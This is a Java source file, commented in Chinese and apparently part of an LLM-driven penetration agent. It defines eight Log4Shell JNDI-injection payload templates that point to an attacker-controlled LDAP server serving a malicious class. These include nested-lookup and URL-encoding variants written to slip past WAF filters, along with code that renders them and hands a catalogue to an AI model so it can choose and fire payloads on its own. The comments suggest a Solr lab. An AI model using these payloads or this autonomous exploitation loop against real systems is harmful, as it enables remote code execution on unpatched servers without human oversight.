package agent;

import java.util.ArrayList;
import java.util.List;

/**
 * Payload 变体：Log4Shell的几种写法
 *
 * 每个变体包含：id（LLM 调用 tryPayloadVariant 时的参数）、name、description（给LLM 看的说明，包括了原理、适用场景和预期）、template（payload 模板）、
 * requires（前置依赖）、notes（成功判据提示）。
 *
 * 实现：把"变体"做成工具参数而不是硬编码的固定顺序，先试哪个、试完观察什么、决定下一个试哪个，全部由 LLM 根据工具返回的"观察结果"自主决定。
 *
 */
public class PayloadVariants {

    /** Payload模板占位符：{host} 攻击机 LDAP 地址，{port} 端口，{class} 恶意类名 */
    public static class Variant {
        public final String id;
        public final String name;
        public final String description;
        public final String template;
        public final String requires;
        public final String notes;

        Variant(String id, String name, String description, String template,
                String requires, String notes) {
            this.id = id;
            this.name = name;
            this.description = description;
            this.template = template;
            this.requires = requires;
            this.notes = notes;
        }
    }

    private static final List<Variant> VARIANTS = new ArrayList<>();

    static {
        add("v01", "基础 LDAP 变体",
                "最直接的形式：${jndi:ldap://.../Exploit}。若目标不做 DN 校验，类名直接作路径即可触发",
                "${jndi:ldap://{host}:{port}/{class}}",
                "LDAP_SERVER",
                "LDAP 回调次数 +1 即命中；部分版本会报 InvalidNameException 而失败（换 v02）");

        add("v02", "合法 DN 变体",
                "把恶意类名写成 LDAP 条目路径 cn=Exploit，规避 InvalidNameException（本实验 Solr 场景的必选项）",
                "${jndi:ldap://{host}:{port}/cn={class}}",
                "LDAP_SERVER",
                "LDAP 回调次数 +1 且 HTTP 收到 /Exploit.class 下载即命中");

        add("v03", "lower 嵌套变体",
                "${${lower:j}ndi:...}：内层 ${lower:j} 先解析出 j，外层拼出 jndi。绕过只过滤 ${jndi 字面量的 WAF/过滤器",
                "${${lower:j}ndi:ldap://{host}:{port}/cn={class}}",
                "LDAP_SERVER",
                "效果同 v02；能过则说明拦截是字面量匹配而非语义解析");

        add("v04", "默认值嵌套变体",
                "${${::-j}ndi:...}：利用 ${::-j} 的默认值语法生成字符 j。另一种常见绕过写法",
                "${${::-j}ndi:ldap://{host}:{port}/cn={class}}",
                "LDAP_SERVER",
                "效果同 v03，与 v03 互为备选");

        add("v05", "URL 编码变体",
                "整条 payload 做 URL 编码后发送。若目标先解码参数再写日志，编码后的 ${...} 仍会被 log4j 展开",
                "%24%7Bjndi:ldap://{host}:{port}/cn={class}%7D",
                "LDAP_SERVER",
                "依赖目标侧的参数解码行为；解码后等价 v02");

        add("v06", "双重 URL 编码变体",
                "二次编码 %2524%257B...。仅当目标存在两层解码（如 WAF 解码 + 应用解码）时有效",
                "%2524%257Bjndi:ldap://{host}:{port}/cn={class}%257D",
                "LDAP_SERVER",
                "通常无效，用于验证目标是否存在双重解码路径");

        add("v07", "DNS 探测变体",
                "${jndi:dns://...}：不执行代码，只触发一次 DNS 查询/回调。用于确认「lookup 可达」而无需真实 RCE",
                "${jndi:dns://{host}:{port}/cn={class}}",
                "NONE",
                "本工具包未实现 DNS 记录收集，回调无法计数；仅作对照/探测思路，通常视为未命中");

        add("v08", "RMI 变体（对照）",
                "${jndi:rmi://...}：经典替代协议。本工具包未提供 RMI 服务端，预期失败；用于对照 LDAP 链路",
                "${jndi:rmi://{host}:{port}/cn={class}}",
                "RMI_SERVER",
                "无 RMI 服务端时必然失败，勿选作首选");
    }

    private static void add(String id, String name, String description, String template,
                            String requires, String notes) {
        VARIANTS.add(new Variant(id, name, description, template, requires, notes));
    }

    public static List<Variant> all() {
        return VARIANTS;
    }

    public static Variant byId(String id) {
        for (Variant v : VARIANTS) {
            if (v.id.equalsIgnoreCase(id)) {
                return v;
            }
        }
        return null;
    }

    /** 把占位符替换为实际值，得到可发送的 payload 字符串 */
    public static String render(Variant v, String host, int port, String className) {
        return v.template
                .replace("{host}", host)
                .replace("{port}", String.valueOf(port))
                .replace("{class}", className);
    }

    /** 目录文本：发给 LLM 的完整变体清单 */
    public static String catalogText() {
        StringBuilder sb = new StringBuilder();
        for (Variant v : VARIANTS) {
            sb.append('[').append(v.id).append("] ").append(v.name).append('\n');
            sb.append("  原理: ").append(v.description).append('\n');
            sb.append("  模板: ").append(v.template).append('\n');
            sb.append("  依赖: ").append(v.requires).append('\n');
            sb.append("  判据: ").append(v.notes).append('\n');
        }
        return sb.toString();
    }
}
